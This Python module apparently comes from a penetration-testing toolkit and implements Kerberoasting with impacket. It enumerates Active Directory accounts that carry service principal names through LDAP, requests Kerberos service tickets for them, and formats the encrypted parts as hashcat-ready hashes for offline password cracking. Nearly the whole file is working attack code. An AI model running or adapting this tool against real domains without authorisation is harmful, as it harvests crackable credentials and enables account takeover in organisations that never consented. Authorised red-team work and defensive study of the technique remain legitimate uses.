"""
Kerberoasting — request TGS tickets for SPN accounts and return crackable hashes.

Uses impacket's LDAP to discover service accounts and Kerberos to request
service tickets that can be cracked offline (hashcat/JtR format).
"""

import logging
from binascii import hexlify
from typing import Any

from pyasn1.codec.der import decoder

from impacket.examples import logger as impacket_logger
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from impacket.ldap import ldap, ldapasn1
from impacket.ntlm import compute_nthash, compute_lmhash
from impacket.examples.utils import ldap_login

# Suppress impacket's noisy logging
logging.getLogger("impacket").setLevel(logging.ERROR)
impacket_logger.init(ts=False, debug=False)


def _make_search_base(domain: str) -> str:
    """Convert ``example.local`` → ``DC=example,DC=local``."""
    return "DC=" + ",DC=".join(domain.split("."))


def _format_tgs_hash(
    decoded_tgs: Any,
    username: str,
    domain: str,
    spn: str,
    output_format: str,
) -> str | None:
    """Format a TGS ticket as a hashcat-mode crackable hash string."""
    etype = decoded_tgs["ticket"]["enc-part"]["etype"]
    cipher = decoded_tgs["ticket"]["enc-part"]["cipher"].asOctets()

    if etype == constants.EncryptionTypes.rc4_hmac.value:
        # $krb5tgs$23$*user$realm$spn*$checksum$edata
        entry = (
            f"$krb5tgs${etype}$*{username}${domain}${spn.replace(':', '~')}"
            f"*${hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}"
        )
    elif etype == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
        entry = (
            f"$krb5tgs${etype}${username}${domain}$*{spn.replace(':', '~')}*"
            f"${hexlify(cipher[-12:]).decode()}${hexlify(cipher[:-12]).decode()}"
        )
    elif etype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
        entry = (
            f"$krb5tgs${etype}${username}${domain}$*{spn.replace(':', '~')}*"
            f"${hexlify(cipher[-12:]).decode()}${hexlify(cipher[:-12]).decode()}"
        )
    elif etype == constants.EncryptionTypes.des_cbc_md5.value:
        entry = (
            f"$krb5tgs${etype}$*{username}${domain}${spn.replace(':', '~')}"
            f"*${hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}"
        )
    else:
        logging.debug("Skipping %s/%s — unsupported e-type %d", username, spn, etype)
        return None

    return entry


async def ad_kerberoast(
    domain: str,
    dc_ip: str,
    username: str = "",
    password: str = "",
    output_format: str = "hashcat",
) -> dict:
    """Request TGS tickets for SPN accounts (Kerberoasting).

    Connects to the target domain controller via LDAP to discover user
    accounts that have Service Principal Names set, then requests TGS
    tickets for each discovered SPN so they can be cracked offline.

    Args:
        domain:        AD domain FQDN (e.g. ``"example.local"``).
        dc_ip:         IP address of a domain controller.
        username:      Optional bind username (empty = anonymous).
        password:      Optional password.
        output_format: Hash format — ``"hashcat"`` (default) or ``"john"``.

    Returns:
        A dict with:
        - ``domain`` / ``dc_ip`` — metadata
        - ``authenticated`` — whether credentials were provided
        - ``hashes`` — list of ``{"hash": …, "format": …, "source": "kerberoast",
          "username": …, "spn": …, "etype": …}``
        - ``accounts`` — list of discovered SPN account summaries
        - ``count`` — total number of hashes returned
        - ``error`` — error message or ``None``
    """
    if output_format not in ("hashcat",):
        raise ValueError(f"Unsupported output_format: '{output_format}'. Only 'hashcat' is supported.")

    ldap_conn = None
    result: dict[str, Any] = {
        "domain": domain,
        "dc_ip": dc_ip,
        "authenticated": bool(username and password),
        "hashes": [],
        "accounts": [],
        "count": 0,
        "error": None,
    }

    try:
        # ------------------------------------------------------------------
        # 1. LDAP search — find user accounts with SPNs
        # ------------------------------------------------------------------
        base_dn = _make_search_base(domain)

        ldap_conn = ldap_login(
            None,
            base_dn,
            dc_ip,
            None,
            False,  # do_kerberos
            username or f"anonymous@{domain}",
            password,
            domain,
            "",  # lmhash
            "",  # nthash
            "",  # aesKey
        )

        search_filter = (
            "(&"
            "(objectCategory=person)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
            "(servicePrincipalName=*)"
            ")"
        )
        paged_control = ldapasn1.SimplePagedResultsControl(
            criticality=True, size=1000
        )

        try:
            resp = ldap_conn.search(
                searchFilter=search_filter,
                attributes=[
                    "servicePrincipalName",
                    "sAMAccountName",
                    "pwdLastSet",
                    "memberOf",
                    "userAccountControl",
                    "lastLogon",
                ],
                searchControls=[paged_control],
            )
        except ldap.LDAPSearchError as e:
            if "sizeLimitExceeded" in str(e):
                resp = e.getAnswers()
            else:
                raise

        # ------------------------------------------------------------------
        # 2. Process LDAP results
        # ------------------------------------------------------------------
        accounts: list[dict[str, Any]] = []
        spn_targets: dict[str, str] = {}  # {sam_account_name: first_spn}

        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue

            sam_name = ""
            spns: list[str] = []
            pwd_last_set = ""
            member_of: list[str] = []
            last_logon = "N/A"
            uac = 0
            delegation = ""

            for attr in item["attributes"]:
                attr_type = str(attr["type"])
                if attr_type == "sAMAccountName":
                    sam_name = str(attr["vals"][0])
                elif attr_type == "servicePrincipalName":
                    for spn_val in attr["vals"]:
                        spns.append(spn_val.asOctets().decode("utf-8", errors="replace"))
                elif attr_type == "pwdLastSet":
                    raw = str(attr["vals"][0])
                    pwd_last_set = "<never>" if raw == "0" else raw
                elif attr_type == "memberOf":
                    member_of = [str(v) for v in attr["vals"]]
                elif attr_type == "lastLogon":
                    raw = str(attr["vals"][0])
                    last_logon = "<never>" if raw == "0" else raw
                elif attr_type == "userAccountControl":
                    uac = int(str(attr["vals"][0]))
                    if uac & 0x80000:  # UF_TRUSTED_FOR_DELEGATION
                        delegation = "unconstrained"
                    elif uac & 0x100000:  # UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
                        delegation = "constrained"

            if not sam_name or not spns:
                continue

            # Skip disabled accounts
            if uac & 0x0002:  # UF_ACCOUNTDISABLE
                continue

            accounts.append({
                "sam_account_name": sam_name,
                "spns": spns,
                "pwd_last_set": pwd_last_set,
                "member_of": member_of,
                "last_logon": last_logon,
                "delegation": delegation,
            })

            # Use the first SPN for TGS request
            spn_targets[sam_name] = spns[0]

        result["accounts"] = accounts

        if not accounts:
            return result

        # ------------------------------------------------------------------
        # 3. Get TGT for authenticated user
        # ------------------------------------------------------------------
        if username and password:
            user_principal = Principal(
                username,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
            )
            try:
                tgt, cipher_tgt, old_sess_key, sess_key = getKerberosTGT(
                    user_principal,
                    password,
                    domain,
                    "",  # lmhash
                    "",  # nthash
                    "",  # aesKey
                    kdcHost=dc_ip,
                )
            except Exception:
                nthash = compute_nthash(password)
                lmhash = compute_lmhash(password)
                tgt, cipher_tgt, old_sess_key, sess_key = getKerberosTGT(
                    user_principal,
                    "",
                    domain,
                    lmhash,
                    nthash,
                    "",
                    kdcHost=dc_ip,
                )
        else:
            result["error"] = (
                "Kerberoasting requires valid credentials. "
                "Anonymous binds cannot request TGS tickets."
            )
            return result

        # ------------------------------------------------------------------
        # 4. Request TGS for each SPN
        # ------------------------------------------------------------------
        for sam_name, spn in spn_targets.items():
            try:
                principal_name = Principal()
                principal_name.type = (
                    constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                )
                down_level = f"{domain}\\{sam_name}"
                principal_name.components = [down_level]

                tgs, cipher_tgs, old_sk, sk = getKerberosTGS(
                    principal_name,
                    domain,
                    dc_ip,
                    tgt,
                    cipher_tgt,
                    sess_key,
                )

                decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

                hash_entry = _format_tgs_hash(
                    decoded, sam_name, domain, spn, output_format,
                )

                if hash_entry:
                    etype_val = int(decoded["ticket"]["enc-part"]["etype"])
                    etype_name = {
                        23: "RC4-HMAC",
                        17: "AES128-CTS-HMAC-SHA1-96",
                        18: "AES256-CTS-HMAC-SHA1-96",
                        16: "DES-CBC-MD5",
                    }.get(etype_val, f"etype-{etype_val}")

                    result["hashes"].append({
                        "hash": hash_entry,
                        "format": output_format,
                        "source": "kerberoast",
                        "username": sam_name,
                        "spn": spn,
                        "etype": etype_name,
                    })

            except Exception as exc:
                logging.debug(
                    "TGS request failed for %s/%s: %s", sam_name, spn, exc
                )

        result["count"] = len(result["hashes"])

    except Exception as exc:
        result["error"] = str(exc)
    finally:
        if ldap_conn is not None:
            try:
                ldap_conn.close()
            except Exception:
                pass

    return result
